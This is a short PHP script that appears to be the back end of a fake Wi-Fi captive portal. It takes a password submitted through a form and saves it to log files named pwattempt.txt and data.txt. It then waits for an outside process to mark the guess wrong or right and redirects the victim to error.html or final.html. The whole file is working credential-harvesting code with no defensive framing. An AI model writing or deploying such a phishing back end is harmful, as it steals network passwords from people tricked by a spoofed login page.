<?php
error_reporting(0);

$count_my_page = ("/log/hit.txt");
$hits = file($count_my_page);
$hits[0] ++;
$fp = fopen($count_my_page , "w");
fputs($fp , $hits[0]);
fclose($fp);

// Receive form Post data and Saving it in variables
$key1 = @$_POST['key1'];

// Write the name of text file where data will be store
$filename = "/log/data.txt";
$filename2 = "/log/status.txt";
$intento = "/log/intento";
$attemptlog = "/log/pwattempt.txt";

// Marge all the variables with text in a single variable.
$f_data= ''.$key1.'';

$pwlog = fopen($attemptlog, "w");
fwrite($pwlog, $f_data);
fwrite($pwlog,"\n");
fclose($pwlog);

$file = fopen($filename, "w");
fwrite($file, $f_data);
fwrite($file,"\n");
fclose($file);

$archivo = fopen($intento, "w");
fwrite($archivo,"\n");
fclose($archivo);

while( 1 ) {

        if (file_get_contents( $intento ) == 1) {
                header("Location:error.html");
                unlink($intento);
            break;
        }

        if (file_get_contents( $intento ) == 2) {
                header("Location:final.html");
                break;
        }

        sleep(1);
}
?>
